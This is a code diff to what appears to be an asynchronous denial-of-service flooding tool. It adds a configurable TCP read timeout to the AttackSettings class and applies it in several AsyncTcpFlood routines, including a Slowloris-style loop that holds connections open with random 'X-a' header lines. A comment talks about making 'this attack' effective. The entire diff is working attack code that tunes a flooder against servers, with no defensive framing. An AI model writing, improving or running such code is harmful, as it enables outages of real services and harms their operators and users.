@@ -620,6 +620,7 @@ class AttackSettings:
     drain_timeout_seconds: float
     close_timeout_seconds: float
     http_response_timeout_seconds: float
+    tcp_read_timeout_seconds: float
     requests_per_connection: int
 
     def __init__(
@@ -630,6 +631,7 @@ class AttackSettings:
         drain_timeout_seconds: float = 0.1,
         close_timeout_seconds: float = 1.0,
         http_response_timeout_seconds: float = 15.0,
+        tcp_read_timeout_seconds: float = 0.2,
         requests_per_connection: int = 1024,
     ):
         self.transport = transport
@@ -637,6 +639,7 @@ class AttackSettings:
         self.drain_timeout_seconds = drain_timeout_seconds
         self.close_timeout_seconds = close_timeout_seconds
         self.http_response_timeout_seconds = http_response_timeout_seconds
+        self.tcp_read_timeout_seconds = tcp_read_timeout_seconds
         self.requests_per_connection = requests_per_connection
 
     @property
@@ -865,7 +868,8 @@ class AsyncTcpFlood(HttpFlood):
                 await self._send_packet(writer, payload)
                 packets_sent += 1
                 # XXX: have to setup buffering properly for this attack to be effective
-                await asyncio.wait_for(reader.read(1), timeout=1)
+                await asyncio.wait_for(
+                    reader.read(1), timeout=self._settings.tcp_read_timeout_seconds)
         finally:
             await self._close_connection(writer)
         return packets_sent > 0
@@ -901,7 +905,8 @@ class AsyncTcpFlood(HttpFlood):
             while True:
                 await self._send_packet(writer, payload)
                 packets_sent += 1
-                await asyncio.wait_for(reader.read(1), timeout=1)
+                await asyncio.wait_for(
+                    reader.read(1), timeout=self._settings.tcp_read_timeout_seconds)
                 for i in range(self._settings.requests_per_connection):
                     keep = str.encode("X-a: %d\r\n" % ProxyTools.Random.rand_int(1, 5000))
                     await self._send_packet(writer, keep)
@@ -924,7 +929,7 @@ class AsyncTcpFlood(HttpFlood):
                     await asyncio.sleep(.01)
                     # XXX: should this be separate setting for config?
                     data = await asyncio.wait_for(
-                        reader.read(1), timeout=self._settings.drain_timeout_seconds)
+                        reader.read(1), timeout=self._settings.tcp_read_timeout_seconds)
                     if not data: break
                 await self._send_packet(writer, b'0')
         finally:
